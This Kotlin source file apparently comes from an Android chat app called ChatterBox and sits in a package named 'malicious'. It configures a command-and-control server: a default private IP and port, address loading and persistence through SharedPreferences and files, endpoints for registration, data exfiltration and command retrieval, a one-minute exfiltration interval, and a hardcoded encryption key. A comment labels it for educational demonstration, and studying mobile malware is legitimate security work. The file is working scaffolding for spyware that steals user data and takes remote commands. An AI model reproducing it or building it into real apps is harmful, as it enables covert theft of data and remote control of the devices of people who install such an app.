package com.example.ChatterBox.malicious

import android.content.Context
import android.util.Log
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

/**
 * Configuration for the Command and Control (C2) server.
 * This class contains global variables for C2 server settings.
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
object C2Config {
    private const val TAG = "C2Config"
    private const val DEFAULT_IP = "192.168.1.214"
    private const val PORT = "42069"
    
    // The IP will be read dynamically from the assets/ip.cfg file
    // If the file doesn't exist or can't be read, it will fall back to the default IP
    private var serverIp = DEFAULT_IP
    
    /**
     * Initializes the C2 configuration by reading the IP from various sources
     * This should be called at application startup
     */
    fun initialize(context: Context) {
        try {
            // First check if there's an IP in SharedPreferences (highest priority)
            val sharedPreferences = context.getSharedPreferences("c2_config", Context.MODE_PRIVATE)
            val prefIp = sharedPreferences.getString("ip", null)
            
            if (!prefIp.isNullOrBlank()) {
                serverIp = prefIp
                Log.d(TAG, "Loaded server IP from SharedPreferences: $serverIp")
                return
            }
            
            // Next check for a local file copy (second priority)
            val localFile = File(context.filesDir, "ip.cfg")
            if (localFile.exists()) {
                val localIp = localFile.readText().trim()
                if (!localIp.isBlank()) {
                    serverIp = localIp
                    Log.d(TAG, "Loaded server IP from local file: $serverIp")
                    return
                }
            }
            
            // Finally, check the assets file (fallback)
            val inputStream = context.assets.open("ip.cfg")
            val reader = BufferedReader(InputStreamReader(inputStream))
            val ip = reader.readLine()?.trim()
            reader.close()
            
            // Update the IP if it's valid
            if (!ip.isNullOrBlank()) {
                serverIp = ip
                Log.d(TAG, "Loaded server IP from assets: $serverIp")
            } else {
                Log.w(TAG, "IP config file was empty, using default IP: $DEFAULT_IP")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading IP config, using default IP: $DEFAULT_IP", e)
        }
    }
    
    /**
     * Get the server base URL using the current IP
     */
    fun getServerUrl(): String {
        return "http://$serverIp:$PORT"
    }
    
    /**
     * Get the registration endpoint URL
     */
    fun getRegistrationEndpoint(): String {
        return "${getServerUrl()}/register"
    }
    
    /**
     * Get the exfiltration endpoint URL
     */
    fun getExfiltrationEndpoint(): String {
        return "${getServerUrl()}/exfil"
    }
    
    /**
     * Get the command endpoint URL
     */
    fun getCommandEndpoint(): String {
        return "${getServerUrl()}/command"
    }
    
    /**
     * Configuration parameters for exfiltration
     */
    const val EXFIL_INTERVAL = 60 * 1000L  // 1 minute
    
    /**
     * Encryption settings
     * Note: In a real application, these would not be hardcoded
     */
    const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
    
    /**
     * Get the current server IP
     */
    fun getServerIp(): String {
        return serverIp
    }
    
    /**
     * Update the server IP programmatically
     */
    fun updateServerIp(newIp: String, context: Context? = null) {
        serverIp = newIp
        Log.d(TAG, "Updated server IP: $serverIp")
        
        // If context is provided, update SharedPreferences for persistence
        context?.let {
            try {
                val sharedPreferences = it.getSharedPreferences("c2_config", Context.MODE_PRIVATE)
                sharedPreferences.edit().putString("ip", newIp).apply()
                Log.d(TAG, "Saved IP to SharedPreferences: $newIp")
                
                // Also save to local file as backup
                val file = File(it.filesDir, "ip.cfg")
                file.writeText(newIp)
                Log.d(TAG, "Saved IP to local file: $newIp")
            } catch (e: Exception) {
                Log.e(TAG, "Error saving IP to storage", e)
            }
        }
    }
}